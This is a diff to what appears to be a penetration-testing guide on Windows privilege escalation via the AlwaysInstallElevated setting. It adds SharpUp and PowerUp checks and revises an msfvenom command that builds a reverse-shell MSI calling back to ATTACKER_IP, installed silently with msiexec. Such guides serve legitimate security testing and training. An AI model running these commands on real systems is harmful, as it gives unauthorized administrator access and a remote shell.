@@ -276,10 +276,20 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
+- Confirm the same condition with SharpUp or PowerUp:
+
+```powershell
+.\SharpUp.exe audit
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+```
+
+Successful output identifies `Always Install Elevated` in SharpUp or an `AlwaysInstallElevated Registry Key` check in PowerUp.
+
 - Generate malicious MSI and install:
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp lhost=ATTACKER_IP -f msi -o setup.msi
+msfvenom -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=LISTENER_PORT -f msi -o setup.msi
 ```
 ```cmd
 msiexec /quiet /qn /i C:\Temp\setup.msi
